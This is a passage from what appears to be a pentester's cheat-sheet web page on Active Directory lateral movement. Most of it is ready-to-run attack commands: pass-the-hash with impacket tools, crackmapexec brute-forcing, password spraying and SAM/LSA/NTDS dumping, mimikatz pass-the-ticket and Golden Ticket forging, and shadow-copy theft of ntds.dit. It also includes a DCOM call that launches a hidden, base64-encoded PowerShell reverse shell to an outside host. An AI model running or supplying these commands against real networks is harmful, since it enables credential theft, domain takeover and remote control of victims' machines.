+</code></pre></div></div> <h2 id="lateral-movement-in-active-directory">Lateral Movement in Active Directory</h2> <p><br/></p> <h3 id="psexec---smbexec---wmiexec---atexec">psexec - smbexec - wmiexec - atexec</h3> <ul> <li>Here we can pass the credentials or even hash, depending on what we have</li> </ul> <blockquote> <p><em>Always pass the full hash to these tools!</em></p> </blockquote> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password1&gt;@&lt;IP&gt;
+<span class="c"># the user should have write access to Admin share then only we can get sesssion</span>
+
+psexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;<span class="nb">command</span><span class="o">&gt;</span>
+<span class="c">#we passed full hash here</span>
+
+smbexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password1&gt;@&lt;IP&gt;
+
+smbexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;<span class="nb">command</span><span class="o">&gt;</span>
+<span class="c">#we passed full hash here</span>
+
+wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password1&gt;@&lt;IP&gt;
+
+wmiexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;<span class="nb">command</span><span class="o">&gt;</span>
+<span class="c">#we passed full hash here</span>
+
+atexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; &lt;<span class="nb">command</span><span class="o">&gt;</span>
+<span class="c">#we passed full hash here</span>
+</code></pre></div></div> <p><br/></p> <h3 id="winrs">winrs</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winrs <span class="nt">-r</span>:&lt;computername&gt; <span class="nt">-u</span>:&lt;user&gt; <span class="nt">-p</span>:&lt;password&gt; <span class="s2">"command"</span>
+<span class="c"># run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell</span>
+<span class="c"># run this on windows session</span>
+</code></pre></div></div> <p><br/></p> <h3 id="crackmapexec">crackmapexec</h3> <ul> <li>If stuck make use of <a href="https://www.crackmapexec.wiki/">Wiki</a></li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec <span class="o">{</span>smb/winrm/mssql/ldap/ftp/ssh/rdp<span class="o">}</span> <span class="c">#supported services</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> user.txt <span class="nt">-p</span> password.txt <span class="nt">--continue-on-success</span> <span class="c"># Bruteforcing attack, smb can be replaced. Shows "Pwned"</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> user.txt <span class="nt">-p</span> password.txt <span class="nt">--continue-on-success</span> | <span class="nb">grep</span> <span class="s1">'[+]'</span> <span class="c">#grepping the way out!</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> user.txt <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--continue-on-success</span>  <span class="c">#Password spraying, vice versa can also be done</span>
+
+<span class="c">#Try --local-auth option if nothing comes up</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--shares</span> <span class="c">#lists all shares, provide creds if you have one</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--disks</span>
+crackmapexec smb &lt;DC-IP&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--users</span> <span class="c">#we need to provide DC ip</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--sessions</span> <span class="c">#active logon sessions</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--pass-pol</span> <span class="c">#dumps password policy</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--sam</span> <span class="c">#SAM hashes</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--lsa</span> <span class="c">#dumping lsa secrets</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--ntds</span> <span class="c">#dumps NTDS.dit file</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">--groups</span> <span class="o">{</span>groupname<span class="o">}</span> <span class="c">#we can also run with a specific group and enumerated users of that group.</span>
+crackmapexec smb &lt;Rhost/range&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">-x</span> <span class="s1">'command'</span> <span class="c">#For executing commands, "-x" for cmd and "-X" for powershell command</span>
+
+<span class="c">#Pass the hash</span>
+crackmapexec smb &lt;ip or range&gt; <span class="nt">-u</span> username <span class="nt">-H</span> &lt;full <span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">--local-auth</span>
+<span class="c">#We can run all the above commands with hash and obtain more information</span>
+
+<span class="c">#crackmapexec modules</span>
+crackmapexec smb <span class="nt">-L</span> <span class="c">#listing modules</span>
+crackmapexec smb <span class="nt">-M</span> mimikatx <span class="nt">--options</span> <span class="c">#shows the required options for the module</span>
+crackmapexec smb &lt;Rhost&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">-M</span> mimikatz <span class="c">#runs default command</span>
+crackmapexec smb &lt;Rhost&gt; <span class="nt">-u</span> <span class="s1">'user'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="nt">-M</span> mimikatz <span class="nt">-o</span> <span class="nv">COMMAND</span><span class="o">=</span><span class="s1">'privilege::debug'</span> <span class="c">#runs specific command-M</span>
+</code></pre></div></div> <ul> <li>Crackmapexec database</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmedb <span class="c">#to launch the console</span>
+<span class="nb">help</span> <span class="c">#run this command to view some others, running individual commands give infor on all the data till now we did.</span>
+</code></pre></div></div> <p><br/></p> <h3 id="pass-the-ticket">Pass the ticket</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\m</span>imikatz.exe
+sekurlsa::tickets /export
+kerberos::ptt <span class="o">[</span>0<span class="p">;</span>76126]-2-0-40e10000-Administrator@krbtgt-&lt;RHOST&gt;.LOCAL.kirbi
+klist
+<span class="nb">dir</span> <span class="se">\\</span>&lt;RHOST&gt;<span class="se">\a</span>dmin<span class="err">$</span>
+</code></pre></div></div> <p><br/></p> <h3 id="dcom">DCOM</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$dcom</span> <span class="o">=</span> <span class="o">[</span>System.Activator]::CreateInstance<span class="o">([</span><span class="nb">type</span><span class="o">]</span>::GetTypeFromProgID<span class="o">(</span><span class="s2">"MMC20.Application.1"</span>,<span class="s2">"192.168.50.73"</span><span class="o">))</span>
+
+<span class="nv">$dcom</span>.Document.ActiveView.ExecuteShellCommand<span class="o">(</span><span class="s2">"cmd"</span>,<span class="nv">$null</span>,<span class="s2">"/c calc"</span>,<span class="s2">"7"</span><span class="o">)</span>
+
+<span class="nv">$dcom</span>.Document.ActiveView.ExecuteShellCommand<span class="o">(</span><span class="s2">"powershell"</span>,<span class="nv">$null</span>,<span class="s2">"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"</span>,<span class="s2">"7"</span><span class="o">)</span>
+</code></pre></div></div> <p><br/></p> <h3 id="golden-ticket">Golden Ticket</h3> <ol> <li>Get the krbtgt hash</li> </ol> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\m</span>imikatz.exe
+privilege::debug
+<span class="c">#below are some ways</span>
+lsadump::lsa /inject /name:krbtgt
+lsadump::lsa /patch
+lsadump::dcsync /user:krbtgt
+
+kerberos::purge <span class="c">#removes any exisiting tickets</span>
+
+<span class="c">#sample command</span>
+kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden
+
+<span class="c">#Saved with name "golden" here, there are other options to check as well</span>
+</code></pre></div></div> <ol> <li>Obtaining access!</li> </ol> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe <span class="c">#no need for highest privileges</span>
+kerberos::ptt golden
+misc::cmd <span class="c">#we're accessing cmd</span>
+</code></pre></div></div> <p><br/></p> <h3 id="shadow-copies">Shadow Copies</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe <span class="nt">-nw</span> <span class="nt">-p</span> C:
+copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy2<span class="se">\w</span>indows<span class="se">\n</span>tds<span class="se">\n</span>tds.dit c:<span class="se">\n</span>tds.dit.bak
+reg.exe save hklm<span class="se">\s</span>ystem c:<span class="se">\s</span>ystem.bak
+impacket-secretsdump <span class="nt">-ntds</span> ntds.dit.bak <span class="nt">-system</span> system.bak LOCAL
+</code></pre></div></div> <hr/> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> -[47z!Lu7h] -[Love is life. And if you miss love, you miss life. ]-[2025]- </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>
